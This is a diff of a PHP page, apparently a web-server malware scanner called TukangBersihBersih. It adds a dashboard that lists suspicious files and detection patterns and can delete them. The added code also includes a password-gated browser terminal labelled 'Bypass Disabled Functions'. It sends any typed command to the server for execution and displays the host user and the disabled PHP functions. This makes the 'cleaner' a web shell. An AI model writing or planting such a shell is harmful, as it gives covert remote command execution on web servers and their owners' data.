-                <p>No malicious code found in <code>" . htmlspecialchars($scan_dir) . "</code></p>
-              </div>";
-    } else {
-        echo "<form method='POST'>
-                <input type='hidden' name='scan_dir' value='" . htmlspecialchars($scan_dir) . "'>
-                <input type='hidden' name='pass' value='$pass_param'>
-                <div class='table-wrap'>
-                    <table>
-                        <thead>
-                            <tr>
-                                <th style='width:40px'><div class='checkbox-wrap'><input type='checkbox' onchange='toggle(this, \"to_delete[]\")'></div></th>
-                                <th>File</th>
-                                <th>Pattern</th>
-                                <th>Size</th>
-                                <th>Modified</th>
-                                <th>Preview</th>
-                            </tr>
-                        </thead>
-                        <tbody>";
-        foreach ($malware_hits as $hit) {
-            echo "<tr>
-                    <td><div class='checkbox-wrap'><input type='checkbox' name='to_delete[]' value='" . htmlspecialchars($hit['path']) . "'></div></td>
-                    <td><code>" . htmlspecialchars($hit['path']) . "</code></td>
-                    <td><code>" . $hit['pattern'] . "</code></td>
-                    <td>" . formatSize($hit['size']) . "</td>
-                    <td style='white-space:nowrap'>" . $hit['modified'] . "</td>
-                    <td><div class='preview'>" . $hit['preview'] . "</div></td>
-                  </tr>";
-        }
-        echo "</tbody></table></div>
-              <div class='actions-bar'>
-                <button type='submit' name='mass_delete' class='btn btn-danger'>
-                    <span class='icon'><svg viewBox='0 0 24 24'><polyline points='3 6 5 6 21 6'/><path d='M19 6v14a2 2 0 01-2 2H7a2 2 0 01-2-2V6m3 0V4a2 2 0 012-2h4a2 2 0 012 2v2'/><line x1='10' y1='11' x2='10' y2='17'/><line x1='14' y1='11' x2='14' y2='17'/></svg></span>
-                    Delete Selected
-                </button>
-              </div>
-              </form>";
-    }
-
-    echo "</div>";
-}
-
-echo "<div class='footer'>
-        <span class='icon' style='width:14px;height:14px;display:inline-flex;vertical-align:-2px'><svg viewBox='0 0 24 24'><rect x='3' y='11' width='18' height='11' rx='2' ry='2'/><path d='M7 11V7a5 5 0 0110 0v4'/></svg></span>
-        Use only by trusted admin. Delete this file after finishing. The preview helps differentiate real webshells from safe files.
-    </div>
+<!-- TOPBAR -->
+<div class="topbar">
+    <div class="topbar-brand"><div class="brand-icon">MAW</div>TukangBersihBersih</div>
+    <span style="color:var(--color-border-secondary);font-size:16px;margin:0 4px">|</span>
+    <span style="font-family:var(--mono);font-size:10px;color:var(--color-text-tertiary)">PATH</span>
+    <form method="POST" style="display:flex;align-items:center;gap:6px;flex:1;max-width:460px">
+        <input class="conn-input" name="scan_dir" value="<?php echo htmlspecialchars($scan_dir); ?>" placeholder="/var/www/html" style="flex:1">
+        <button type="submit" class="conn-btn">Scan</button>
+    </form>
+    <span class="status-dot"></span>
+    <span style="font-family:var(--mono);font-size:10px;color:var(--green)"><?php echo htmlspecialchars($scan_dir); ?></span>
+    <span style="margin-left:auto" class="tag">v2.1</span>
+    <span class="pill <?php echo $total_threats > 0 ? 'pill-red' : 'pill-green'; ?>"><?php echo $total_threats; ?> threats</span>
 </div>
 
+<!-- SIDEBAR -->
+<div class="sidebar">
+    <div class="sidebar-heading">Overview</div>
+    <div class="nav-item active" onclick="nav('dashboard',this)">
+        <svg class="nav-icon" viewBox="0 0 16 16" fill="none"><rect x="1" y="1" width="6" height="6" rx="1" stroke="currentColor" stroke-width="1.2"/><rect x="9" y="1" width="6" height="6" rx="1" stroke="currentColor" stroke-width="1.2"/><rect x="1" y="9" width="6" height="6" rx="1" stroke="currentColor" stroke-width="1.2"/><rect x="9" y="9" width="6" height="6" rx="1" stroke="currentColor" stroke-width="1.2"/></svg>
+        Dashboard
+    </div>
+
+    <div class="sidebar-heading" style="margin-top:4px">Scanner</div>
+    <div class="nav-item" onclick="nav('dangerous',this)">
+        <svg class="nav-icon" viewBox="0 0 16 16" fill="none"><path d="M8 1L14 4.5V11.5L8 15L2 11.5V4.5L8 1Z" stroke="currentColor" stroke-width="1.2" stroke-linejoin="round"/><path d="M8 6V9" stroke="currentColor" stroke-width="1.5" stroke-linecap="round"/><circle cx="8" cy="11.5" r="0.8" fill="currentColor"/></svg>
+        Dangerous Files
+        <?php if ($dangerous_count > 0): ?><span class="nav-badge" style="background:rgba(239,68,68,.12);border-color:var(--red);color:var(--red)"><?php echo $dangerous_count; ?></span><?php endif; ?>
+    </div>
+    <div class="nav-item" onclick="nav('malware',this)">
+        <svg class="nav-icon" viewBox="0 0 16 16" fill="none"><path d="M8 1L14 4.5V11.5L8 15L2 11.5V4.5L8 1Z" stroke="currentColor" stroke-width="1.2" stroke-linejoin="round"/><circle cx="8" cy="8" r="2" stroke="currentColor" stroke-width="1.2"/></svg>
+        Malware
+        <?php if ($malware_count > 0): ?><span class="nav-badge" style="background:rgba(239,68,68,.12);border-color:var(--red);color:var(--red)"><?php echo $malware_count; ?></span><?php endif; ?>
+    </div>
+
+    <div class="sidebar-heading" style="margin-top:4px">Tools</div>
+    <div class="nav-item" onclick="nav('scan-dir',this)">
+        <svg class="nav-icon" viewBox="0 0 16 16" fill="none"><circle cx="7" cy="7" r="4.5" stroke="currentColor" stroke-width="1.2"/><line x1="10.2" y1="10.2" x2="14" y2="14" stroke="currentColor" stroke-width="1.2" stroke-linecap="round"/></svg>
+        Scan Directory
+    </div>
+    <div class="nav-item" onclick="nav('terminal',this)">
+        <svg class="nav-icon" viewBox="0 0 16 16" fill="none"><rect x="1" y="2" width="14" height="12" rx="2" stroke="currentColor" stroke-width="1.2"/><polyline points="4,6 7,9 4,12" stroke="currentColor" stroke-width="1.2" stroke-linecap="round" stroke-linejoin="round"/><line x1="9" y1="12" x2="13" y2="12" stroke="currentColor" stroke-width="1.2" stroke-linecap="round"/></svg>
+        Terminal
+    </div>
+    <?php if ($deleted_count > 0): ?>
+    <div class="nav-item" onclick="nav('deleted',this)">
+        <svg class="nav-icon" viewBox="0 0 16 16" fill="none"><path d="M3 4h10M5 4V3a1 1 0 011-1h4a1 1 0 011 1v1M6 7v5M10 7v5M12 4v9a1 1 0 01-1 1H5a1 1 0 01-1-1V4" stroke="currentColor" stroke-width="1.2" stroke-linecap="round"/></svg>
+        Deleted
+        <span class="nav-badge" style="background:var(--green-dim);border-color:var(--green);color:var(--green)"><?php echo $deleted_count; ?></span>
+    </div>
+    <?php endif; ?>
+</div>
+
+<!-- MAIN -->
+<div class="main" id="main-content">
+
+<!-- ══ DASHBOARD ══ -->
+<div class="panel-section active" id="panel-dashboard">
+<div class="scroll-y">
+    <div class="metrics-grid">
+        <div class="metric-card">
+            <div class="metric-label">Scan Directory</div>
+            <div class="metric-value" style="font-size:13px;word-break:break-all"><?php echo htmlspecialchars(basename($scan_dir)); ?></div>
+            <div class="metric-sub" style="font-size:9px;word-break:break-all"><?php echo htmlspecialchars($scan_dir); ?></div>
+            <div class="metric-bar"><div class="metric-bar-fill" style="width:0%" data-w="100"></div></div>
+        </div>
+        <div class="metric-card">
+            <div class="metric-label">Malware</div>
+            <div class="metric-value" style="color:<?php echo $malware_count > 0 ? 'var(--red)' : 'var(--green)'; ?>"><?php echo $malware_count; ?></div>
+            <div class="metric-sub">pattern matches</div>
+            <div class="metric-bar"><div class="metric-bar-fill <?php echo $malware_count > 0 ? 'danger' : ''; ?>" style="width:0%" data-w="<?php echo min($malware_count * 10, 100); ?>"></div></div>
+        </div>
+        <div class="metric-card">
+            <div class="metric-label">Dangerous Files</div>
+            <div class="metric-value" style="color:<?php echo $dangerous_count > 0 ? 'var(--amber)' : 'var(--green)'; ?>"><?php echo $dangerous_count; ?></div>
+            <div class="metric-sub">suspicious extensions</div>
+            <div class="metric-bar"><div class="metric-bar-fill <?php echo $dangerous_count > 0 ? 'warn' : ''; ?>" style="width:0%" data-w="<?php echo min($dangerous_count * 10, 100); ?>"></div></div>
+            <?php if ($dangerous_count > 0): ?>
+            <div class="ext-breakdown" style="margin-top:6px">
+                <?php foreach ($ext_counts as $cat => $cnt): ?>
+                    <?php if ($cnt > 0): ?>
+                    <span class="pill pill-<?php echo $ext_severity[$cat]; ?>"><?php echo $ext_labels[$cat]; ?>: <?php echo $cnt; ?></span>
+                    <?php endif; ?>
+                <?php endforeach; ?>
+            </div>
+            <?php endif; ?>
+        </div>
+        <div class="metric-card">
+            <div class="metric-label">Files Deleted</div>
+            <div class="metric-value"><?php echo $deleted_count; ?></div>
+            <div class="metric-sub">removed this session</div>
+            <div class="metric-bar"><div class="metric-bar-fill" style="width:0%" data-w="<?php echo $deleted_count > 0 ? 50 : 0; ?>"></div></div>
+        </div>
+        <div class="metric-card">
+            <div class="metric-label">Scan Time</div>
+            <div class="metric-value"><?php echo $scan_elapsed; ?><?php if ($scan_timed_out): ?><span style="font-size:12px;color:var(--red)">s !</span><?php else: ?><span style="font-size:12px;color:var(--color-text-tertiary)">s</span><?php endif; ?></div>
+            <div class="metric-sub"><?php echo $scan_timed_out ? 'timed out — partial results' : 'completed'; ?></div>
+            <div class="metric-bar"><div class="metric-bar-fill <?php echo $scan_timed_out ? 'danger' : ''; ?>" style="width:0%" data-w="<?php echo min($scan_elapsed * 4, 100); ?>"></div></div>
+        </div>
+    </div>
+
+    <div class="section-label">Quick Actions</div>
+    <div class="ref-grid">
+        <div class="ref-card" onclick="nav('malware',document.querySelectorAll('.nav-item')[3])">
+            <div class="ref-module">Scanner::</div>
+            <div class="ref-fn">Malware Results</div>
+            <div class="ref-desc"><?php echo $malware_count > 0 ? $malware_count . ' suspicious file(s)' : 'No threats found'; ?></div>
+        </div>
+        <div class="ref-card" onclick="nav('dangerous',document.querySelectorAll('.nav-item')[2])">
+            <div class="ref-module">Scanner::</div>
+            <div class="ref-fn">Dangerous Files</div>
+            <div class="ref-desc"><?php echo $dangerous_count > 0 ? $dangerous_count . ' dangerous file(s)' : 'No dangerous extensions'; ?></div>
+        </div>
+        <div class="ref-card" onclick="nav('scan-dir',document.querySelectorAll('.nav-item')[4])">
+            <div class="ref-module">Scanner::</div>
+            <div class="ref-fn">Change Directory</div>
+            <div class="ref-desc">Scan a different path</div>
+        </div>
+        <?php if ($deleted_count > 0): ?>
+        <div class="ref-card" onclick="nav('deleted',document.querySelectorAll('.nav-item')[5])">
+            <div class="ref-module">Scanner::</div>
+            <div class="ref-fn">Deleted Files</div>
+            <div class="ref-desc"><?php echo $deleted_count; ?> file(s) removed</div>
+        </div>
+        <?php endif; ?>
+    </div>
+
+    <?php if ($dangerous_count > 0): ?>
+    <div class="card">
+        <div class="card-header"><span class="card-title">Dangerous Extensions Found</span><button class="btn sm" onclick="nav('dangerous',document.querySelectorAll('.nav-item')[2])">View All</button></div>
+        <table>
+            <thead><tr><th>File</th><th>Type</th><th>Size</th><th>Modified</th></tr></thead>
+            <tbody>
+                <?php foreach (array_slice($dangerous_files, 0, 5) as $df): ?>
+                <tr>
+                    <td class="td-primary td-mono" style="max-width:300px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap"><?php echo htmlspecialchars($df['path']); ?></td>
+                    <td><span class="pill pill-<?php echo $ext_severity[$df['cat']]; ?>"><?php echo $df['ext']; ?> <?php echo $ext_labels[$df['cat']]; ?></span></td>
+                    <td class="td-mono"><?php echo formatSize($df['size']); ?></td>
+                    <td class="td-mono" style="color:var(--color-text-tertiary);font-size:10px"><?php echo $df['modified']; ?></td>
+                </tr>
+                <?php endforeach; ?>
+            </tbody>
+        </table>
+    </div>
+    <?php endif; ?>
+
+    <?php if ($malware_count > 0): ?>
+    <div class="card">
+        <div class="card-header"><span class="card-title">Recent Malware Detections</span><button class="btn sm" onclick="nav('malware',document.querySelectorAll('.nav-item')[3])">View All</button></div>
+        <table>
+            <thead><tr><th>File</th><th>Pattern</th><th>Size</th><th>Modified</th></tr></thead>
+            <tbody>
+                <?php foreach (array_slice($malware_hits, 0, 5) as $hit): ?>
+                <tr>
+                    <td class="td-primary td-mono" style="max-width:300px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap"><?php echo htmlspecialchars($hit['path']); ?></td>
+                    <td><span class="pill pill-red"><?php echo $hit['pattern']; ?></span></td>
+                    <td class="td-mono"><?php echo formatSize($hit['size']); ?></td>
+                    <td class="td-mono" style="color:var(--color-text-tertiary);font-size:10px"><?php echo $hit['modified']; ?></td>
+                </tr>
+                <?php endforeach; ?>
+            </tbody>
+        </table>
+    </div>
+    <?php endif; ?>
+
+    <?php if (isset($error)): ?>
+    <div class="card" style="border-color:var(--red)">
+        <div class="card-body" style="color:var(--red);font-family:var(--mono);font-size:11px"><?php echo $error; ?></div>
+    </div>
+    <?php endif; ?>
+
+    <?php if ($scan_timed_out): ?>
+    <div class="card" style="border-color:var(--amber)">
+        <div class="card-body" style="color:var(--amber);font-family:var(--mono);font-size:11px">Scan timed out after <?php echo $max_scan_seconds; ?>s. Results may be incomplete. Try scanning a more specific subdirectory.</div>
+    </div>
+    <?php endif; ?>
+
+    <?php if ($scan_truncated && !$scan_timed_out): ?>
+    <div class="card" style="border-color:var(--amber)">
+        <div class="card-body" style="color:var(--amber);font-family:var(--mono);font-size:11px">Result limit (<?php echo $max_scan_results; ?>) reached. Some files may not be shown. Try scanning a more specific directory.</div>
+    </div>
+    <?php endif; ?>
+</div>
+</div>
+
+<!-- ══ DANGEROUS FILES ══ -->
+<div class="panel-section" id="panel-dangerous">
+<div class="scroll-y">
+<?php if (empty($dangerous_files)): ?>
+    <div class="card">
+        <div class="card-body">
+            <div class="empty-state">
+                <div class="empty-icon">&#10003;</div>
+                No dangerous extension files found in <code style="color:var(--green)"><?php echo htmlspecialchars($scan_dir); ?></code><br>
+                <span style="color:var(--color-text-tertiary);font-size:10px;margin-top:4px;display:block">Checked: <?php echo implode(', ', array_map(function($e){ return implode(', ', $e); }, $dangerous_extensions)); ?></span>
+            </div>
+        </div>
+    </div>
+<?php else: ?>
+    <div style="display:flex;flex-wrap:wrap;gap:6px;margin-bottom:4px">
+        <?php foreach ($ext_counts as $cat => $cnt): ?>
+            <?php if ($cnt > 0): ?>
+            <span class="pill pill-<?php echo $ext_severity[$cat]; ?>"><?php echo $ext_labels[$cat]; ?> (.<?php echo $cat; ?>): <?php echo $cnt; ?></span>
+            <?php endif; ?>
+        <?php endforeach; ?>
+    </div>
+
+    <form method="POST">
+        <input type="hidden" name="scan_dir" value="<?php echo htmlspecialchars($scan_dir); ?>">
+        <?php foreach ($dangerous_files as $i => $df): ?>
+        <div class="card">
+            <div class="card-header">
+                <input type="checkbox" name="to_delete[]" value="<?php echo htmlspecialchars($df['path']); ?>" style="accent-color:var(--green);width:14px;height:14px;flex-shrink:0">
+                <span class="card-title" style="font-family:var(--mono);font-size:10.5px"><?php echo htmlspecialchars($df['path']); ?></span>
+                <span class="pill pill-<?php echo $ext_severity[$df['cat']]; ?>"><?php echo $df['ext']; ?> <?php echo $ext_labels[$df['cat']]; ?></span>
+                <span class="pill pill-gray"><?php echo formatSize($df['size']); ?></span>
+                <span style="font-family:var(--mono);font-size:9px;color:var(--color-text-tertiary)"><?php echo $df['modified']; ?></span>
+                <button type="submit" name="delete_single" value="<?php echo htmlspecialchars($df['path']); ?>" class="icon-btn red" onclick="return confirm('Delete this file?')" style="margin-left:auto">delete</button>
+            </div>
+            <div style="padding:0"><div class="preview-box"><?php echo $df['preview']; ?></div></div>
+        </div>
+        <?php endforeach; ?>
+        <div style="display:flex;align-items:center;gap:10px;padding:10px 0">
+            <button type="submit" name="mass_delete" class="btn sm danger" onclick="return confirmDelete(this)">Delete Selected</button>
+            <label style="display:flex;align-items:center;gap:5px;font-family:var(--mono);font-size:10px;color:var(--color-text-tertiary);cursor:pointer">
+                <input type="checkbox" onchange="toggleAll(this,'to_delete[]')" style="accent-color:var(--green);width:12px;height:12px">Select all
+            </label>
+        </div>
+    </form>
+<?php endif; ?>
+</div>
+</div>
+
+<!-- ══ MALWARE ══ -->
+<div class="panel-section" id="panel-malware">
+<div class="scroll-y">
+<?php if (empty($malware_hits)): ?>
+    <div class="card">
+        <div class="card-body">
+            <div class="empty-state">
+                <div class="empty-icon">&#10003;</div>
+                No malicious code found in <code style="color:var(--green)"><?php echo htmlspecialchars($scan_dir); ?></code>
+            </div>
+        </div>
+    </div>
+<?php else: ?>
+    <form method="POST">
+        <input type="hidden" name="scan_dir" value="<?php echo htmlspecialchars($scan_dir); ?>">
+        <?php foreach ($malware_hits as $i => $hit): ?>
+        <div class="card">
+            <div class="card-header">
+                <input type="checkbox" name="to_delete[]" value="<?php echo htmlspecialchars($hit['path']); ?>" style="accent-color:var(--green);width:14px;height:14px;flex-shrink:0">
+                <span class="card-title" style="font-family:var(--mono);font-size:10.5px"><?php echo htmlspecialchars($hit['path']); ?></span>
+                <span class="pill pill-red"><?php echo $hit['pattern']; ?></span>
+                <span class="pill pill-gray"><?php echo formatSize($hit['size']); ?></span>
+                <span style="font-family:var(--mono);font-size:9px;color:var(--color-text-tertiary)"><?php echo $hit['modified']; ?></span>
+                <button type="submit" name="delete_single" value="<?php echo htmlspecialchars($hit['path']); ?>" class="icon-btn red" onclick="return confirm('Delete this file?')" style="margin-left:auto">delete</button>
+            </div>
+            <div style="padding:0"><div class="preview-box"><?php echo $hit['preview']; ?></div></div>
+        </div>
+        <?php endforeach; ?>
+        <div style="display:flex;align-items:center;gap:10px;padding:10px 0">
+            <button type="submit" name="mass_delete" class="btn sm danger" onclick="return confirmDelete(this)">Delete Selected</button>
+            <label style="display:flex;align-items:center;gap:5px;font-family:var(--mono);font-size:10px;color:var(--color-text-tertiary);cursor:pointer">
+                <input type="checkbox" onchange="toggleAll(this,'to_delete[]')" style="accent-color:var(--green);width:12px;height:12px">Select all
+            </label>
+        </div>
+    </form>
+<?php endif; ?>
+</div>
+</div>
+
+<!-- ══ TERMINAL ══ -->
+<div class="panel-section" id="panel-terminal">
+<div class="term-shell">
+    <div class="term-topbar">
+        <span class="term-dot" style="background:#ff5f57"></span>
+        <span class="term-dot" style="background:#febc2e"></span>
+        <span class="term-dot" style="background:#28c840"></span>
+        <span class="term-title" id="term-title"><?php echo get_current_user(); ?>@<?php echo php_uname('n'); ?> — Shell</span>
+        <button onclick="clearTerm()" style="background:none;border:.5px solid #2a3530;border-radius:3px;padding:2px 8px;font-size:10px;cursor:pointer;color:#4a5a52;font-family:var(--mono)">clear</button>
+        <button onclick="termHelp()" style="background:none;border:.5px solid #2a3530;border-radius:3px;padding:2px 8px;font-size:10px;cursor:pointer;color:#4a5a52;font-family:var(--mono);margin-left:4px">help</button>
+    </div>
+    <div class="term-body" id="term-body"></div>
+    <div class="term-input-row">
+        <span class="term-prompt-inline" id="term-prompt"><?php echo get_current_user(); ?>@<?php echo php_uname('n'); ?>:<?php echo htmlspecialchars($default_dir); ?>$</span>
+        <input class="term-input" id="term-input" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" placeholder="type a command…" onkeydown="termKeydown(event)">
+    </div>
+</div>
+</div>
+
+<!-- ══ SCAN DIRECTORY ══ -->
+<div class="panel-section" id="panel-scan-dir">
+<div class="scroll-y">
+    <div class="card">
+        <div class="card-header"><span class="card-title">Change Scan Directory</span></div>
+        <div class="card-body">
+            <form method="POST">
+                <label class="form-label">Directory Path</label>
+                <input class="form-input" name="scan_dir" value="<?php echo htmlspecialchars($scan_dir); ?>" placeholder="/var/www/html" style="margin-bottom:12px">
+                <div style="display:flex;gap:8px;flex-wrap:wrap;margin-bottom:16px">
+                    <button type="button" class="btn sm" onclick="document.querySelector('#panel-scan-dir input[name=scan_dir]').value='<?php echo htmlspecialchars($_SERVER['DOCUMENT_ROOT'] ?? '/var/www/html'); ?>'">Document Root</button>
+                    <button type="button" class="btn sm" onclick="document.querySelector('#panel-scan-dir input[name=scan_dir]').value='/home'">/home</button>
+                    <button type="button" class="btn sm" onclick="document.querySelector('#panel-scan-dir input[name=scan_dir]').value='/tmp'">/tmp</button>
+                    <button type="button" class="btn sm" onclick="document.querySelector('#panel-scan-dir input[name=scan_dir]').value='/var/www'">/var/www</button>
+                </div>
+                <button type="submit" class="conn-btn">Scan Directory</button>
+            </form>
+            <div style="margin-top:16px;font-size:10px;color:var(--color-text-tertiary);font-family:var(--mono)">
+                Common paths:
+                <code style="color:var(--color-text-secondary)">/var/www/html</code>,
+                <code style="color:var(--color-text-secondary)">/home</code>,
+                <code style="color:var(--color-text-tertiary)">/tmp</code>,
+                <code style="color:var(--color-text-secondary)">/home/<?php echo get_current_user(); ?>/public_html</code>
+            </div>
+        </div>
+    </div>
+
+    <div class="section-label">Patterns Checked</div>
+    <div class="card">
+        <div class="card-header"><span class="card-title"><?php echo count($suspicious_patterns); ?> detection patterns</span></div>
+        <div class="card-body" style="display:flex;flex-wrap:wrap;gap:4px">
+            <?php foreach (array_slice($suspicious_patterns, 0, 30) as $p): ?>
+            <span class="pill pill-gray"><?php echo htmlspecialchars($p); ?></span>
+            <?php endforeach; ?>
+            <?php if (count($suspicious_patterns) > 30): ?>
+            <span class="pill pill-gray">+<?php echo count($suspicious_patterns) - 30; ?> more</span>
+            <?php endif; ?>
+        </div>
+    </div>
+
+    <div class="section-label">Dangerous Extensions Scanned</div>
+    <div class="card">
+        <div class="card-header"><span class="card-title"><?php echo count($dangerous_extensions); ?> extension types</span></div>
+        <div class="card-body" style="display:flex;flex-wrap:wrap;gap:6px">
+            <?php foreach ($dangerous_extensions as $cat => $exts): ?>
+            <span class="pill pill-<?php echo $ext_severity[$cat]; ?>"><?php echo $ext_labels[$cat]; ?> (<?php echo implode(', ', $exts); ?>)</span>
+            <?php endforeach; ?>
+        </div>
+    </div>
+</div>
+</div>
+
+<?php if ($deleted_count > 0): ?>
+<!-- ══ DELETED ══ -->
+<div class="panel-section" id="panel-deleted">
+<div class="scroll-y">
+    <div class="card">
+        <div class="card-header"><span class="card-title">Successfully Deleted</span><span class="pill pill-green"><?php echo $deleted_count; ?> files</span></div>
+        <table>
+            <thead><tr><th>File</th><th>Status</th></tr></thead>
+            <tbody>
+                <?php foreach ($deleted_files as $file): ?>
+                <tr>
+                    <td class="td-primary td-mono"><?php echo htmlspecialchars(basename($file)); ?></td>
+                    <td><span class="pill pill-green">deleted</span></td>
+                </tr>
+                <?php endforeach; ?>
+            </tbody>
+        </table>
+    </div>
+</div>
+</div>
+<?php endif; ?>
+
+</div><!-- .main -->
+</div><!-- .shell -->
+
+<div class="toast-area" id="toast-area"></div>
+
+<?php if ($deleted_count > 0): ?>
 <script>
-function toggle(source, name) {
-    document.querySelectorAll('input[name=\"' + name + '\"]').forEach(cb => {
-        cb.checked = source.checked;
+(function(){
+    toast('success','<?php echo $deleted_count; ?> file(s) deleted successfully');
+})();
+</script>
+<?php endif; ?>
+
+<?php if (isset($error)): ?>
+<script>
+(function(){
+    toast('error','<?php echo addslashes($error); ?>');
+})();
+</script>
+<?php endif; ?>
+
+<script>
+function toggleAll(source,name){
+    document.querySelectorAll('input[name="'+name+'"]').forEach(function(cb){
+        cb.checked=source.checked;
     });
 }
-document.querySelectorAll('form').forEach(form => {
-    if (form.querySelector('[type=\"submit\"][name=\"mass_delete\"]')) {
-        form.onsubmit = () => confirm('Are you sure you want to delete the selected files?');
+
+function confirmDelete(btn){
+    var checked=document.querySelectorAll('input[name="to_delete[]"]:checked');
+    if(checked.length===0){
+        toast('error','Select files to delete first');
+        return false;
     }
+    return confirm('Are you sure you want to delete '+checked.length+' selected file(s)?');
+}
+
+function toast(type,msg){
+    var area=document.getElementById('toast-area');
+    var el=document.createElement('div');
+    el.className='toast '+type;
+    el.innerHTML=(type==='success'?'<span style="color:var(--green)">&#10003;</span>':'<span style="color:var(--red)">&#10007;</span>')+' '+msg;
+    area.appendChild(el);
+    setTimeout(function(){el.remove()},4000);
+}
+
+document.addEventListener('DOMContentLoaded',function(){
+    setTimeout(function(){
+        document.querySelectorAll('[data-w]').forEach(function(b){
+            b.style.width=b.dataset.w+'%';
+        });
+    },400);
+    termInit();
 });
+
+var termCwd='<?php echo addslashes($default_dir); ?>';
+var termUser='<?php echo addslashes(get_current_user()); ?>';
+var termHost='<?php echo addslashes(php_uname("n")); ?>';
+var termHistory=[];
+var termHistIdx=-1;
+
+function termInit(){
+    termPrint('info','Terminal Ultramaw — Bypass Disabled Functions');
+    termPrint('info','Connected as '+termUser+'@'+termHost);
+    var dis='<?php echo addslashes(implode(", ",array_filter(array_map("trim",explode(",",ini_get("disable_functions")))))); ?>';
+    if(dis){termPrint('warn','Disabled functions: '+dis);}
+    termPrint('info','Jangan Lupa Ngopi dan Mandi.\n');
+}
+
+function nav(page,el){
+    document.querySelectorAll('.nav-item').forEach(function(n){n.classList.remove('active')});
+    el.classList.add('active');
+    document.querySelectorAll('.panel-section').forEach(function(s){s.classList.remove('active')});
+    var t=document.getElementById('panel-'+page);
+    if(t)t.classList.add('active');
+    if(page==='terminal')document.getElementById('term-input').focus();
+}
+
+function termPrint(type,text){
+    var body=document.getElementById('term-body');
+    var div=document.createElement('div');
+    div.className='term-out '+(type||'');
+    div.textContent=text;
+    body.appendChild(div);
+    body.scrollTop=body.scrollHeight;
+}
+
+function termEcho(cmd){
+    var body=document.getElementById('term-body');
+    var div=document.createElement('div');
+    div.className='term-line';
+    div.innerHTML='<span class="term-prompt">'+escHtml(termUser+'@'+termHost+':'+termCwd.replace(/\/home\/[^/]+/,'~')+'$')+'</span><span class="term-cmd">'+escHtml(cmd)+'</span>';
+    body.appendChild(div);
+    body.scrollTop=body.scrollHeight;
+}
+
+function escHtml(s){return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');}
+
+function clearTerm(){
+    document.getElementById('term-body').innerHTML='';
+    termPrint('info','Terminal cleared.');
+}
+
+function termHelp(){
+    termPrint('info','Available commands:');
+    termPrint('info','  help              Show this help');
+    termPrint('info','  pwd               Print working directory');
+    termPrint('info','  cd <dir>          Change directory');
+    termPrint('info','  ls [dir]          List directory');
+    termPrint('info','  cat <file>        Read file content');
+    termPrint('info','  whoami            Current user');
+    termPrint('info','  uname             System info');
+    termPrint('info','  id                User ID info');
+    termPrint('info','  phpinfo           PHP version & info');
+    termPrint('info','  disabled          List disabled functions');
+    termPrint('info','  methods           Show available exec methods');
+    termPrint('info','  clear             Clear terminal');
+    termPrint('info','  <cmd>             Execute via best available method');
+}
+
+function termKeydown(e){
+    var input=document.getElementById('term-input');
+    if(e.key==='Enter'){
+        var cmd=input.value.trim();
+        if(!cmd)return;
+        termHistory.unshift(cmd);termHistIdx=-1;
+        termEcho(cmd);
+        input.value='';
+        sendCmd(cmd);
+    }else if(e.key==='ArrowUp'){
+        e.preventDefault();
+        if(termHistIdx<termHistory.length-1){termHistIdx++;input.value=termHistory[termHistIdx];}
+    }else if(e.key==='ArrowDown'){
+        e.preventDefault();
+        if(termHistIdx>0){termHistIdx--;input.value=termHistory[termHistIdx];}
+        else{termHistIdx=-1;input.value='';}
+    }else if(e.key==='l'&&e.ctrlKey){
+        e.preventDefault();clearTerm();
+    }else if(e.key==='c'&&e.ctrlKey){
+        termEcho(input.value+'^C');input.value='';
+    }
+}
+
+function sendCmd(cmd){
+    if(cmd==='clear'){clearTerm();return;}
+    var xhr=new XMLHttpRequest();
+    xhr.open('POST',window.location.href.split('?')[0]+'?ultra=<?php echo urlencode($access_password); ?>',true);
+    xhr.setRequestHeader('Content-Type','application/x-www-form-urlencoded');
+    xhr.onload=function(){
+        try{
+            var r=JSON.parse(xhr.responseText);
+            if(r.method&&r.method!=='cd'&&r.method!=='builtin'&&r.method!=='help'&&r.method!=='clear'){
+                termPrint('','['+r.method+']');
+            }
+            if(r.output!==undefined&&r.output!==''){
+                var outType='';
+                if(r.method==='blocked'||r.method==='bypass'&&r.output.indexOf('not found')>-1)outType='err';
+                r.output.split('\n').forEach(function(l){termPrint(outType,l);});
+            }
+            if(r.cwd){termCwd=r.cwd;updatePrompt();}
+        }catch(e){
+            termPrint('err','Parse error');
+        }
+        document.getElementById('term-body').scrollTop=99999;
+    };
+    xhr.onerror=function(){termPrint('err','Connection error');};
+    xhr.send('term_cmd='+encodeURIComponent(cmd)+'&term_cwd='+encodeURIComponent(termCwd));
+}
+
+function updatePrompt(){
+    var display=termCwd.replace(/\/home\/[^/]+/,'~');
+    document.getElementById('term-prompt').textContent=termUser+'@'+termHost+':'+display+'$ ';
+}
 </script>
+
 </body>
-</html>";
-?>
+</html>
